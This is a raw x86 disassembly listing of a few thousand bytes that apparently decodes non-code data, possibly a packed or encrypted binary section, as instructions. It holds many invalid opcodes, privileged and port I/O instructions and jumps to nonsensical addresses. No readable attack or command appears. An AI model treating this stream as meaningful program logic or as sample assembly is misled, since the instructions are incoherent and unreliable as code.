  4362b3:	test   DWORD PTR [ecx-0x2cdc40ad],eax
  4362b9:	pop    esi
  4362ba:	mov    eax,ds:0x417ba451
  4362bf:	cli    
  4362c0:	or     eax,0x43927365
  4362c5:	mov    bl,0x1
  4362c7:	cmp    esp,DWORD PTR [ebp-0x27353031]
  4362cd:	add    bh,BYTE PTR [eax-0x6]
  4362d0:	imul   ebx,DWORD PTR [ebx],0xaa1c0738
  4362d6:	addr16 fs pop ds
  4362d9:	iret   
  4362da:	je     0x4362d0
  4362dc:	and    eax,ebp
  4362de:	repnz fisttp WORD PTR [edx-0x15368809]
  4362e5:	cs sahf 
  4362e7:	jns    0x43632b
  4362e9:	ins    DWORD PTR es:[edi],dx
  4362ea:	adc    al,0x1a
  4362ec:	dec    ecx
  4362ed:	mov    esp,edi
  4362ef:	mov    dh,0x9c
  4362f1:	mov    cs,WORD PTR [ebx-0x5f]
  4362f4:	push   ss
  4362f5:	adc    al,cl
  4362f7:	(bad)  
  4362f9:	jns    0x436282
  4362fb:	mov    ds:0x8175244d,al
  436300:	loop   0x436286
  436302:	rol    BYTE PTR [ebx+0x17bc35ea],1
  436308:	lock adc DWORD PTR [ecx],esi
  43630b:	jle    0x43635b
  43630d:	inc    ebx
  43630e:	test   BYTE PTR [ebx],ah
  436310:	mov    al,ds:0x525b5424
  436315:	scas   eax,DWORD PTR es:[edi]
  436316:	xrelease mov BYTE PTR [esi+edi*2],cl
  43631a:	adc    eax,DWORD PTR [edi+ecx*1+0x6800005c]
  436321:	push   es
  436322:	mov    bl,0x79
  436324:	add    DWORD PTR [ebx+eax*2+0x62],ebx
  436328:	or     eax,0xddd8432c
  43632d:	test   BYTE PTR fs:[edx],al
  436330:	jmp    0x436338
  436332:	xchg   ebp,eax
  436333:	pop    es
  436334:	rcl    BYTE PTR [ebx],cl
  436336:	add    BYTE PTR [edx],dl
  436338:	ret    0x718
  43633b:	sbb    ebp,DWORD PTR [ecx]
  43633d:	retf   0xe84
  436340:	rcr    DWORD PTR [eax],1
  436342:	cmp    ah,0x42
  436345:	sub    DWORD PTR [esi-0x3a],eax
  436348:	and    edx,ebx
  43634a:	xor    al,0x1c
  43634c:	xchg   ecx,eax
  43634d:	push   eax
  43634e:	(bad)  
  43634f:	dec    ecx
  436350:	push   es
  436351:	repnz mov al,0xa9
  436354:	xor    DWORD PTR [ecx+0x68],eax
  436357:	and    esp,DWORD PTR [esi]
  436359:	cmp    BYTE PTR [ebp+0x18],dh
  43635c:	push   0x8403d81b
  436361:	and    cl,BYTE PTR [esi]
  436363:	jp     0x43639d
  436365:	fldenv es:[ebx]
  436368:	sub    BYTE PTR gs:[eax+0x31],dh
  43636c:	sar    bl,0xd8
  43636f:	fld    TBYTE PTR [eax-0x6f2fc7a8]
  436375:	cmp    al,al
  436377:	jb     0x43631a
  436379:	sti    
  43637a:	es xchg esi,eax
  43637c:	or     eax,0xce417c9e
  436381:	cmovo  ebx,DWORD PTR ds:0x2e047104
  436388:	add    BYTE PTR [ebp-0x67ca6944],0x34
  43638f:	pop    ecx
  436390:	in     al,dx
  436391:	push   edi
  436392:	aam    0x31
  436394:	es jl  0x1c433bd2
  43639b:	xor    DWORD PTR [eax],eax
  43639d:	lods   eax,DWORD PTR ds:[esi]
  43639e:	pop    ecx
  43639f:	mov    ebx,0x8db1b138
  4363a4:	leave  
  4363a5:	clc    
  4363a6:	pop    ebx
  4363a7:	enter  0x8a26,0x4d
  4363ab:	push   es
  4363ac:	inc    edx
  4363ad:	scas   al,BYTE PTR es:[edi]
  4363ae:	inc    ebx
  4363af:	test   BYTE PTR ds:0x10023e40,0x8
  4363b6:	dec    esp
  4363b7:	sti    
  4363b8:	pop    edx
  4363b9:	cmp    al,0x7f
  4363bb:	dec    edx
  4363bc:	popw   ss
  4363be:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4363c0:	mov    eax,ds:0x131f8e55
  4363c5:	and    WORD PTR [esp+eax*4-0x471e16c],sp
  4363cd:	dec    DWORD PTR [edi+esi*8+0x34]
  4363d1:	adc    BYTE PTR [edi+ecx*1],dh
  4363d4:	ins    BYTE PTR es:[edi],dx
  4363d5:	push   0xa
  4363d7:	data16 loopne 0x43641e
  4363da:	add    al,0x96
  4363dc:	jp     0x436409
  4363de:	es cmp al,0x2d
  4363e1:	test   bl,ah
  4363e3:	jb     0x436436
  4363e5:	int3   
  4363e6:	hlt    
  4363e7:	into   
  4363e8:	repz jb 0x4363bd
  4363eb:	dec    esi
  4363ec:	dec    ecx
  4363ed:	push   ss
  4363ee:	mov    al,0x17
  4363f0:	jecxz  0x4363ef
  4363f2:	std    
  4363f3:	mov    dl,0xca
  4363f5:	inc    edi
  4363f6:	cdq    
  4363f7:	sub    al,0xd0
  4363f9:	je     0x436462
  4363fb:	in     eax,0xa2
  4363fd:	fwait
  4363fe:	sar    BYTE PTR [ebp+0x14ad691],1
  436404:	adc    ah,cl
  436406:	xor    eax,0xf889da6c
  43640b:	jl     0x43643e
  43640d:	sahf   
  43640e:	neg    DWORD PTR ds:0xd12bef71
  436414:	jle    0x436464
  436416:	cmp    cl,BYTE PTR [esi-0x17]
  436419:	popf   
  43641a:	mov    eax,0xbfd92dfe
  43641f:	mov    dl,0x1c
  436421:	or     edi,DWORD PTR [ebx]
  436423:	ins    DWORD PTR es:[edi],dx
  436424:	cld    
  436425:	jmp    0x436458
  436427:	fisub  WORD PTR [eax+0x4c]
  43642a:	jo     0x436444
  43642c:	adc    ebp,DWORD PTR [edx+0x4b]
  43642f:	jmp    0x43641b
  436431:	mov    cl,0xec
  436433:	jmp    esp
  436435:	imul   eax,DWORD PTR [eax+0x40],0xe1223f03
  43643c:	xor    al,0xd0
  43643e:	cwde   
  43643f:	sub    al,0x66
  436441:	dec    esi
  436442:	ret    
  436443:	data16 fstp DWORD PTR [ecx-0x7de31875]
  43644a:	sbb    DWORD PTR [eax],ebx
  43644c:	stos   BYTE PTR es:[edi],al
  43644d:	lock cmp eax,0x6fa1ca8c
  436453:	out    0x1d,al
  436455:	cmp    BYTE PTR [ecx],bh
  436457:	ins    BYTE PTR es:[edi],dx
  436458:	(bad)  
  436459:	mov    al,0x35
  43645b:	push   ecx
  43645c:	mov    BYTE PTR [esi+0x3e8f1ef],al
  436462:	es jecxz 0x436449
  436465:	push   es
  436466:	adc    BYTE PTR [esi-0x6f],al
  436469:	push   eax
  43646a:	push   cs
  43646b:	sub    esp,DWORD PTR [edx]
  43646d:	and    DWORD PTR [eax],esi
  43646f:	cmp    eax,0x8640d1a3
  436474:	mov    dl,0x24
  436476:	imul   edx,DWORD PTR [edx+0x30],0x28
  43647a:	and    DWORD PTR [eax+edx*2],ebx
  43647d:	sti    
  43647e:	xor    DWORD PTR [ebp-0x4c0f932f],edx
  436484:	add    DWORD PTR [ecx+0x26],ebx
  436487:	(bad)  
  436489:	stos   BYTE PTR es:[edi],al
  43648a:	cmp    DWORD PTR [eax],0x17
  43648d:	retf   0x81b8
  436490:	mov    ds:0x2a57f401,eax
  436495:	cmp    dh,BYTE PTR [esi+0x4278939f]
  43649b:	imul   eax,DWORD PTR [ebp+edi*2+0x0],0xd9848a3a
  4364a3:	mov    cs,WORD PTR [ecx+0x68]
  4364a6:	xchg   edi,eax
  4364a7:	ins    DWORD PTR es:[edi],dx
  4364a8:	sub    ecx,ecx
  4364aa:	pop    esi
  4364ab:	pusha  
  4364ac:	bound  ecx,QWORD PTR [esi+0x530107a0]
  4364b2:	and    BYTE PTR [eax+0x20],al
  4364b5:	retf   0x2e3c
  4364b8:	xchg   DWORD PTR ds:0xd1ccaa21,ebx
  4364be:	push   esp
  4364bf:	shr    BYTE PTR [esi-0xf],0xf6
  4364c3:	and    ecx,DWORD PTR ds:0xd1001ec1
  4364c9:	test   DWORD PTR [ebx+0x0],ebx
  4364cc:	aad    0x86
  4364ce:	out    0x1,eax
  4364d0:	sbb    dl,BYTE PTR es:[edx-0x37d24815]
  4364d7:	xchg   edx,eax
  4364d8:	sbb    dh,BYTE PTR ds:0x3dfe2574
  4364de:	and    eax,0x11bed697
  4364e3:	sbb    esi,DWORD PTR [edx+0x32]
  4364e6:	push   es
  4364e7:	jmp    0x8eaf:0x92f163db
  4364ee:	aam    0x45
  4364f0:	jmp    0x4364b3
  4364f2:	jnp    0x43648f
  4364f4:	cli    
  4364f5:	cli    
  4364f6:	ins    DWORD PTR es:[edi],dx
  4364f7:	sar    edi,1
  4364f9:	out    0xe5,eax
  4364fb:	repnz push ebx
  4364fd:	jmp    0xcca82d01
  436502:	jbe    0x4364f2
  436504:	repz mov al,ds:0x4ca0d464
  43650a:	cs leave 
  43650c:	test   dh,cl
  43650e:	mov    di,0x35e1
  436512:	pusha  
  436513:	icebp  
  436514:	xchg   ebx,eax
  436515:	and    edi,edx
  436517:	xchg   ecx,eax
  436518:	cmc    
  436519:	jmp    0x436593
  43651b:	mov    WORD PTR [edi+0x5a],cs
  43651e:	aam    0x64
  436520:	loopne 0x4364b3
  436522:	and    bl,BYTE PTR [ebp+0x768d01de]
  436528:	mov    bl,0x8c
  43652a:	adc    esp,eax
  43652c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43652d:	xchg   ebx,eax
  43652e:	in     al,dx
  43652f:	rol    dl,1
  436531:	aas    
  436532:	inc    edx
  436533:	pop    edx
  436534:	jo     0x4365a0
  436536:	imul   esi,edx,0x19
  436539:	and    al,0xe6
  43653b:	popa   
  43653c:	call   0x9f614512
  436541:	cmp    eax,0xab40ed18
  436546:	cmp    BYTE PTR [ecx],bl
  436548:	mov    edi,0xb50e2f79
  43654d:	cmp    al,0xc7
  43654f:	pop    ds
  436550:	stos   BYTE PTR es:[edi],al
  436551:	xor    DWORD PTR [esi-0x26],ecx
  436554:	je     0x436555
  436556:	or     DWORD PTR [ecx],edi
  436558:	mov    dl,0xf2
  43655a:	mov    sp,0x447f
  43655e:	(bad)  
  43655f:	bound  edx,QWORD PTR [eax+0x6e680ab]
  436565:	loop   0x4364fb
  436567:	lds    ecx,FWORD PTR [esi]
  436569:	daa    
  43656a:	inc    esp
  43656b:	addr16 mov dh,0x76
  43656e:	mul    ebp
  436570:	test   BYTE PTR [edi],ah
  436572:	ror    BYTE PTR [ebp-0xb0dbea0],1
  436578:	pusha  
  436579:	jo     0x43659e
  43657b:	jns    0x436582
  43657d:	bound  esp,QWORD PTR [edx]
  43657f:	dec    ebp
  436580:	in     al,0x80
  436582:	or     al,0xc8
  436584:	jns    0x436597
  436586:	cwde   
  436587:	and    al,0xf8
  436589:	jnp    0x4365f1
  43658b:	in     al,0x68
  43658d:	or     dl,bl
  43658f:	sub    bl,BYTE PTR [ecx-0x75]
  436592:	mov    al,0x34
  436594:	popa   
  436595:	xchg   ebx,eax
  436596:	jae    0x436568
  436598:	jne    0x436565
  43659a:	in     al,0x1e
  43659c:	test   BYTE PTR [ecx+esi*2],dl
  43659f:	mov    dl,0x93
  4365a1:	fs add al,0x19
  4365a4:	sub    BYTE PTR [esi+0x15cfa124],ah
  4365aa:	cmp    DWORD PTR [ebx+0x236b3672],edx
  4365b0:	cwde   
  4365b1:	pop    es
  4365b2:	mov    al,0x3a
  4365b4:	inc    esp
  4365b5:	imul   esi,DWORD PTR [eax+0x68],0x22
  4365b9:	hlt    
  4365ba:	and    eax,0x752ccad7
  4365bf:	inc    ebp
  4365c0:	adc    al,0x0
  4365c2:	ror    BYTE PTR [ebx],0xf6
  4365c5:	add    al,0x5e
  4365c7:	popa   
  4365c8:	and    BYTE PTR [edi],0xd8
  4365cb:	std    
  4365cc:	rcl    BYTE PTR [ebx],0xd9
  4365cf:	inc    eax
  4365d0:	cmp    BYTE PTR [edi-0x40],ch
  4365d3:	mov    eax,0x4d79c5a7
  4365d8:	div    BYTE PTR [esi]
  4365da:	xchg   ebx,eax
  4365db:	popa   
  4365dc:	mov    DWORD PTR [esi],0xe03d916e
  4365e2:	dec    eax
  4365e3:	xor    eax,0x30842cc2
  4365e8:	jbe    0x4365cc
  4365ea:	stc    
  4365eb:	in     al,0x21
  4365ed:	push   eax
  4365ee:	outs   dx,DWORD PTR ds:[esi]
  4365ef:	or     bh,0x37
  4365f2:	les    esp,FWORD PTR fs:[eax]
  4365f5:	loope  0x436621
  4365f7:	push   0x18
  4365f9:	push   eax
  4365fa:	sbb    DWORD PTR [esi],0x20
  4365fd:	push   ebx
  4365fe:	fwait
  4365ff:	in     al,dx
  436600:	lea    ebp,[ebp-0x6c]
  436603:	pop    ecx
  436604:	ins    DWORD PTR es:[edi],dx
  436605:	mov    edx,0xca5167b2
  43660a:	imul   ecx,DWORD PTR [edi+0x2e],0xffd8e4f
  436611:	mov    dh,BYTE PTR [eax+0x26]
  436614:	fimul  DWORD PTR [edx]
  436616:	scas   al,BYTE PTR es:[edi]
  436617:	sbb    al,cl
  436619:	(bad)  
  43661a:	leave  
  43661b:	jb     0x436656
  43661d:	push   ss
  43661e:	push   0x2ebfb352
  436623:	mov    edi,0x466fcd39
  436629:	mov    edi,0x2743e8c1
  43662e:	dec    ebp
  43662f:	outs   dx,BYTE PTR ds:[esi]
  436630:	dec    DWORD PTR [eax+0x2c]
  436633:	mov    edx,0x9dfbd949
  436638:	sti    
  436639:	pop    ss
  43663a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43663b:	gs xchg esi,eax
  43663d:	pop    esi
  43663e:	test   BYTE PTR [esp+eiz*2-0x110c7f1f],ch
  436645:	jp     0x4366b3
  436647:	push   esp
  436648:	mov    ah,0xb0
  43664a:	cwd    
  43664c:	add    bl,BYTE PTR [ebp+0x7910c08]
  436652:	repnz sub al,0xc0
  436655:	(bad)  
  436656:	mov    bl,0x40
  436658:	(bad)  [esp+0x6]
  43665c:	loope  0x436606
  43665e:	cmp    al,0x1e
  436660:	fwait
  436661:	xchg   ebp,eax
  436662:	mov    dl,0x6e
  436664:	test   eax,0xfa3a74f
  436669:	js     0x43661e
  43666b:	popa   
  43666c:	stos   BYTE PTR es:[edi],al
  43666d:	imul   edx,DWORD PTR [eax-0x452c95a7],0x7de2d78
  436677:	inc    edx
  436678:	ja     0x2407c0a5
  43667e:	rol    DWORD PTR [edi+0x526caaf],1
  436684:	add    al,0x9b
  436686:	inc    eax
  436687:	jne    0x436652
  436689:	add    esp,DWORD PTR [eax-0x22]
  43668c:	mov    al,ds:0x9a34c716
  436691:	xchg   edx,eax
  436692:	mov    ebp,0x20f384fe
  436697:	inc    ebx
  436698:	and    DWORD PTR [ebx+0xf],esp
  43669b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43669c:	and    DWORD PTR [ecx],esp
  43669e:	push   esi
  43669f:	push   cs
  4366a0:	sbb    dl,dl
  4366a2:	xchg   cl,ah
  4366a4:	add    ah,0x37
  4366a7:	add    eax,0x4a080f83
  4366ac:	adc    BYTE PTR [ebx-0x49],0x62
  4366b0:	inc    BYTE PTR [ecx]
  4366b2:	stos   BYTE PTR es:[edi],al
  4366b3:	in     eax,dx
  4366b4:	retf   
  4366b5:	jno    0x43672e
  4366b7:	push   0x7bc66ec0
  4366bc:	mov    eax,ds:0x31919af4
  4366c1:	adc    ch,BYTE PTR [ecx-0x63]
  4366c4:	loope  0x4366b6
  4366c6:	les    esi,FWORD PTR [ebx+0xed1b5f]
  4366cc:	dec    edx
  4366cd:	sahf   
  4366ce:	push   edi
  4366cf:	sub    eax,0xd39077c2
  4366d4:	mov    dh,0xe7
  4366d6:	mov    DWORD PTR [ebp-0x68],esi
  4366d9:	retf   0xca79
  4366dc:	repnz mov ah,0x9c
  4366df:	xor    cl,BYTE PTR [ebx+ecx*4]
  4366e2:	adc    ebp,ebp
  4366e4:	add    eax,DWORD PTR [eax+0x54]
  4366e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4366e8:	add    al,0x3
  4366ea:	push   esp
  4366eb:	inc    eax
  4366ec:	pushf  
  4366ed:	jb     0x436716
  4366ef:	outs   dx,BYTE PTR ds:[esi]
  4366f0:	enter  0x713,0x56
  4366f4:	sub    ah,BYTE PTR gs:[ebp+0x5c87fd5c]
  4366fb:	add    ecx,DWORD PTR [esp+edi*1+0x2a]
  4366ff:	pop    ss
  436700:	mov    dh,0xd5
  436702:	scas   al,BYTE PTR es:[edi]
  436703:	in     al,dx
  436704:	sub    cl,0x90
  436707:	mov    cl,0xf8
  436709:	and    al,al
  43670b:	or     bh,bh
  43670d:	or     eax,0x51629d65
  436712:	inc    eax
  436713:	sar    DWORD PTR [esi+ebx*1+0x465a7513],1
  43671a:	or     al,0x52
  43671c:	jne    0x436733
  43671e:	iret   
  43671f:	sub    esi,eax
  436721:	dec    edi
  436722:	in     al,dx
  436723:	sbb    al,0xbc
  436725:	lods   al,BYTE PTR ds:[esi]
  436726:	pushf  
  436727:	or     bl,bh
  436729:	xor    ah,ch
  43672b:	shl    DWORD PTR [esp+ebx*1-0x53ce9bee],cl
  436732:	data16 jge 0x436758
  436735:	call   0x12f8:0xcdab20d0
  43673c:	sbb    dh,BYTE PTR [ebx+0x19e54205]
  436742:	ficomp WORD PTR [ebp-0x1e34d182]
  436748:	sbb    eax,0x97fa5184
  43674d:	aam    0xf7
  43674f:	jae    0x4367c3
  436751:	fadd   DWORD PTR [esi+0x685847ac]
  436757:	inc    eax
  436758:	xor    edx,DWORD PTR [edx+0x2e]
  43675b:	jnp    0x4367ad
  43675d:	jbe    0x436763
  43675f:	shl    bh,cl
  436761:	pop    edx
  436762:	sbb    DWORD PTR [edx+edx*4-0x3a],edx
  436766:	out    dx,eax
  436767:	test   ah,ch
  436769:	cmp    al,0xa2
  43676b:	push   esp
  43676c:	cmp    ah,dh
  43676e:	pop    ecx
  43676f:	fcomi  st,st(1)
  436771:	pop    esp
  436772:	and    BYTE PTR [edx],0xa8
  436775:	enter  0x7253,0x56
  436779:	(bad)  [ebx-0x5d3ac82f]
  43677f:	jnp    0x4367d1
  436781:	dec    esi
  436782:	cwde   
  436783:	inc    ecx
  436784:	jo     0x4367e9
  436786:	mov    bh,0x2
  436788:	call   0x2c1abc2f
  43678d:	icebp  
  43678e:	ins    BYTE PTR es:[edi],dx
  43678f:	(bad)
  436794:	lods   eax,DWORD PTR ds:[esi]
  436795:	push   ds
  436796:	mov    ?,WORD PTR [esi+0xa80b181]
  43679c:	sbb    eax,0x26000f3f
  4367a1:	add    BYTE PTR [esp+eiz*4],ch
  4367a4:	je     0x4367c5
  4367a6:	xchg   ebx,eax
  4367a7:	mov    ecx,0x3ce120f7
  4367ac:	push   ds
  4367ad:	fisttp WORD PTR [ebp+0x43961c8]
  4367b3:	add    cl,BYTE PTR [ecx+0x759fbc62]
  4367b9:	dec    ecx
  4367ba:	adc    DWORD PTR [ecx-0x5c929342],ebx
  4367c0:	xor    eax,0x4207cb8c
  4367c5:	pop    esi
  4367c6:	cmc    
  4367c7:	cmp    edi,ecx
  4367c9:	imul   eax,DWORD PTR [ecx+0x7d],0xffffffc6
  4367cd:	and    BYTE PTR fs:[edi+eax*1],al
  4367d1:	adc    ecx,0x68
  4367d4:	mov    edi,?
  4367d6:	sbb    esi,DWORD PTR [edx+0x35]
  4367d9:	sahf   
  4367da:	xor    esi,DWORD PTR [ecx-0xb8316a]
  4367e0:	dec    ecx
  4367e1:	sahf   
  4367e2:	add    ah,dl
  4367e4:	ds sub ebx,edx
  4367e7:	test   al,0xe5
  4367e9:	adc    eax,0x303f58ae
  4367ee:	pusha  
  4367ef:	push   ebx
  4367f0:	dec    ebp
  4367f1:	sbb    DWORD PTR [ebx+ebp*2-0x6583b361],esi
  4367f8:	fwait
  4367f9:	enter  0x597f,0x55
  4367fd:	outs   dx,DWORD PTR ds:[esi]
  4367fe:	inc    edx
  4367ff:	not    DWORD PTR [ebx]
  436801:	jb     0x43678c
  436803:	jp     0x436801
  436805:	imul   ebp,esp,0x67
  436808:	nop
  436809:	mov    BYTE PTR [ebp-0x39],ah
  43680c:	repnz rol DWORD PTR [eax+0x2bc61302],1
  436813:	leave  
  436814:	neg    ch
  436816:	popf   
  436817:	in     al,dx
  436818:	loope  0x43686e
  43681a:	mov    eax,0xfc022081
  43681f:	aaa    
  436820:	cmp    esi,edx
  436822:	test   al,0xb3
  436824:	mov    ecx,0x6c9380df
  436829:	dec    eax
  43682a:	push   cs
  43682b:	jmp    0x4742320d
  436830:	ficom  DWORD PTR [edx-0x6ce0a8f3]
  436836:	cmp    DWORD PTR [ecx],0x41
  436839:	push   cs
  43683a:	add    ecx,esi
  43683c:	ror    BYTE PTR [esi],1
  43683e:	sbb    esi,esi
  436840:	mov    eax,0x253eef18
  436845:	xor    ecx,ebx
  436847:	push   ds
  436848:	xchg   edx,eax
  436849:	inc    ebx
  43684a:	dec    edx
  43684b:	pusha  
  43684c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43684d:	jmp    0x4367f2
  43684f:	shr    DWORD PTR [ecx+0x71],cl
  436852:	mov    edi,0x8148831e
  436857:	dec    edx
  436858:	ss inc esi
  43685a:	xchg   ebp,eax
  43685b:	pushf  
  43685c:	dec    ebp
  43685d:	js     0x4368bb
  43685f:	push   es
  436860:	sbb    eax,0x4d8f1791
  436865:	inc    esi
  436866:	cwde   
  436867:	dec    esp
  436868:	jb     0x436863
  43686a:	stos   DWORD PTR es:[edi],eax
  43686b:	out    dx,al
  43686c:	js     0x43685d
  43686e:	xchg   edx,eax
  43686f:	sbb    al,0xaf
  436871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436872:	cmp    eax,0x1bdae3c7
  436877:	icebp  
  436878:	jnp    0x4368ba
  43687a:	inc    esi
  43687b:	push   ss
  43687c:	xchg   edx,eax
  43687d:	clc    
  43687e:	test   BYTE PTR [esi+edi*2-0x387b08ba],ah
  436885:	int    0x58
  436887:	cwde   
  436888:	adc    al,0x15
  43688a:	add    ebp,esp
  43688c:	daa    
  43688d:	cmp    DWORD PTR [esi-0x6aabb674],esp
  436893:	sub    eax,0x4e498a64
  436898:	(bad)  
  436899:	addr16 nop
  43689b:	push   esp
  43689c:	out    0x10,al
  43689e:	outs   dx,DWORD PTR ds:[esi]
  43689f:	int3   
  4368a0:	mov    DWORD PTR [edx-0x66ca6c68],ebp
  4368a6:	lahf   
  4368a7:	(bad)
  4368ab:	adc    ebx,DWORD PTR [esi]
  4368ad:	enter  0xa7e6,0x14
  4368b1:	fwait
  4368b2:	dec    edi
  4368b3:	xor    esi,edx
  4368b5:	jmp    0x434bfcf7
  4368ba:	stos   DWORD PTR es:[edi],eax
  4368bb:	push   0xda0d194
  4368c0:	mov    cl,0x39
  4368c2:	push   edx
  4368c3:	fisttp WORD PTR [ecx-0x3d]
  4368c6:	jge    0x436909
  4368c8:	push   ss
  4368c9:	lods   al,BYTE PTR ds:[esi]
  4368ca:	mov    al,ds:0x29c53905
  4368cf:	lods   eax,DWORD PTR ds:[esi]
  4368d0:	lds    ecx,FWORD PTR [ecx]
  4368d2:	dec    eax
  4368d3:	mov    eax,ds:0x3f98fdd1
  4368d8:	xor    al,0xad
  4368da:	fnstsw WORD PTR [eax+0x17]
  4368dd:	arpl   WORD PTR [ecx-0x5c],ax
  4368e0:	add    edx,DWORD PTR [ebp+0x5776331d]
  4368e6:	into   
  4368e7:	push   esi
  4368e8:	in     eax,dx
  4368e9:	mov    dh,BYTE PTR [ecx]
  4368eb:	pop    edi
  4368ec:	xchg   ebp,eax
  4368ed:	aad    0x6b
  4368ef:	add    al,0xe
  4368f1:	icebp  
  4368f2:	mul    BYTE PTR [ebp+0x1bf8f9ec]
  4368f8:	or     BYTE PTR [ecx],cl
  4368fa:	ret    0xc995
  4368fd:	es jecxz 0x4368d4
  436900:	(bad)  
  436901:	stc    
  436902:	cdq    
  436903:	inc    ebx
  436904:	(bad)  
  436905:	sar    DWORD PTR [edx+0x19],cl
  436908:	mov    edi,ecx
  43690a:	rcr    DWORD PTR [esi+0x6e],1
  43690d:	(bad)  
  43690e:	mov    ebx,0x2e654320
  436913:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436914:	fs (bad) 
  436916:	in     eax,dx
  436917:	jle    0x436977
  436919:	mov    esi,0x925daecc
  43691e:	mov    ch,0x20
  436920:	add    al,0x5
  436922:	and    DWORD PTR [esi],edi
  436924:	push   cs
  436925:	inc    ebp
  436926:	test   al,al
  436928:	jl     0x436986
  43692a:	add    edx,DWORD PTR [esi-0x3433991d]
  436930:	nop
  436931:	pushf  
  436932:	xor    BYTE PTR [ebp-0x677d4299],dl
  436938:	les    esi,FWORD PTR [ecx+0x5f]
  43693b:	push   ss
  43693c:	add    al,al
  43693e:	xor    eax,0x5dd163ab
  436943:	xchg   edi,eax
  436944:	sbb    eax,0x398ae04f
  436949:	test   eax,0xe236eb51
  43694e:	and    eax,0x20675955
  436953:	xor    BYTE PTR [edx+ecx*1-0x1f],al
  436957:	mov    BYTE PTR [eax],ah
  436959:	inc    ebp
  43695a:	js     0x4369a6
  43695c:	jbe    0x436926
  43695e:	int3   
  43695f:	enter  0x3f2a,0x5c
  436963:	adc    DWORD PTR [eax+edi*2+0xd27c6c2],0x6a09bb15
  43696e:	sub    eax,0x1c92e56c
  436973:	mov    edx,0x5040fde2
  436978:	sbb    esi,DWORD PTR [ebx-0x3f3b8ac2]
  43697e:	cs retf 
  436980:	and    eax,0x8650a1b1
  436985:	add    eax,DWORD PTR [ecx-0x6364f938]
  43698b:	ja     0x436930
  43698d:	ret    0x7053
  436990:	loope  0x436920
  436992:	dec    esp
  436993:	push   ebx
  436994:	xchg   BYTE PTR [ebp-0x4],bh
  436997:	xchg   BYTE PTR [edi+eiz*8+0x6780e7c6],cl
  43699e:	sahf   
  43699f:	push   ebx
  4369a0:	or     BYTE PTR [eax+0x31],bl
  4369a3:	mov    cl,0xed
  4369a5:	into   
  4369a6:	call   0xa808ced2
  4369ab:	loop   0x43694b
  4369ad:	and    esi,DWORD PTR [ecx+0xd]
  4369b0:	gs int3 
  4369b2:	jo     0x436948
  4369b4:	xchg   esi,eax
  4369b5:	mov    ds:0x27c84fdd,al
  4369ba:	in     al,0xa4
  4369bc:	dec    esp
  4369bd:	inc    ebp
  4369be:	inc    esi
  4369bf:	pop    eax
  4369c0:	or     dh,cl
  4369c2:	xor    DWORD PTR [ebx],0xea157532
  4369c8:	sub    bl,BYTE PTR [ebx]
  4369ca:	add    BYTE PTR [ecx],al
  4369cc:	jo     0x436a2b
  4369ce:	push   esi
  4369cf:	and    DWORD PTR [ecx],ebp
  4369d1:	adc    DWORD PTR [esi],edi
  4369d3:	adc    eax,0x13c160fd
  4369d8:	imul   DWORD PTR [edi+0x6401d6cd]
  4369de:	and    eax,0xb1e727b0
  4369e3:	div    esp
  4369e5:	stc    
  4369e6:	push   ebp
  4369e7:	fnstcw WORD PTR [ebx+0xf]
  4369ea:	pop    es
  4369eb:	inc    ebx
  4369ec:	adc    cl,BYTE PTR [eax-0x29]
  4369ef:	in     al,0xa4
  4369f1:	daa    
  4369f2:	ins    BYTE PTR es:[edi],dx
  4369f3:	pop    esp
  4369f4:	shl    BYTE PTR [ebx-0x5f],cl
  4369f7:	push   0xffffff87
  4369f9:	cmp    eax,DWORD PTR [edx]
  4369fb:	outs   dx,DWORD PTR ds:[esi]
  4369fc:	xor    eax,0x304c3160
  436a01:	xor    ch,bh
  436a03:	repnz mov WORD PTR ds:0xe47246b4,?
  436a0a:	cmp    DWORD PTR [ebx-0x1cbc057e],0x6985a7c2
  436a14:	leave  
  436a15:	pushf  
  436a16:	lock pop esp
  436a18:	shl    BYTE PTR [ebx+0x8],1
  436a1b:	ja     0x436a35
  436a1d:	stos   DWORD PTR es:[edi],eax
  436a1e:	dec    ecx
  436a1f:	push   es
  436a20:	sbb    edx,DWORD PTR [ebx+eax*2+0x4a5d4c5]
  436a27:	fs xor al,0x2a
  436a2a:	outs   dx,DWORD PTR ds:[esi]
  436a2b:	je     0x436aa9
  436a2d:	adc    DWORD PTR [ebx-0x1321630f],ecx
  436a33:	std    
  436a34:	fnsave [ecx-0x7ff51f7a]
  436a3a:	into   
  436a3b:	stos   DWORD PTR es:[edi],eax
  436a3c:	sub    ebx,DWORD PTR [ebx-0x19]
  436a3f:	adc    al,0x41
  436a41:	shr    DWORD PTR [ecx-0x72],0x96
  436a45:	sub    cl,0x0
  436a48:	cmp    edx,DWORD PTR [ebx]
  436a4a:	test   DWORD PTR [eax+eax*2+0x56],ebx
  436a4e:	inc    edx
  436a4f:	clc    
  436a50:	or     dl,BYTE PTR [edx]
  436a52:	adc    bl,BYTE PTR [edi+0x8]
  436a55:	inc    esp
  436a56:	and    BYTE PTR [eax],bh
  436a58:	lods   eax,DWORD PTR ds:[esi]
  436a59:	adc    DWORD PTR [edx+0x65],ebp
  436a5c:	add    DWORD PTR [eax+0x395d804c],edx
  436a62:	outs   dx,BYTE PTR ds:[esi]
  436a63:	push   cs
  436a64:	out    0x18,eax
  436a66:	add    eax,DWORD PTR [edi-0x78]
  436a69:	mov    fs,WORD PTR [edx-0x7b]
  436a6c:	fcomp  DWORD PTR [ebx+0xdfb2b5]
  436a72:	daa    
  436a73:	add    al,0xb1
  436a75:	ror    DWORD PTR [ebp+0x316d33ac],1
  436a7b:	icebp  
  436a7c:	xor    dl,ah
  436a7e:	nop
  436a7f:	adc    DWORD PTR [ebp-0x3a],eax
  436a82:	sbb    ecx,DWORD PTR [ecx+0x1f]
  436a85:	mov    bh,BYTE PTR [ebx-0x58]
  436a88:	xchg   edi,eax
  436a89:	ja     0x436adf
  436a8b:	(bad)  
  436a8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436a8d:	mov    ds:0x2fab532e,eax
  436a92:	or     eax,0x3ed16bf4
  436a97:	adc    BYTE PTR [eax+0x1b],ah
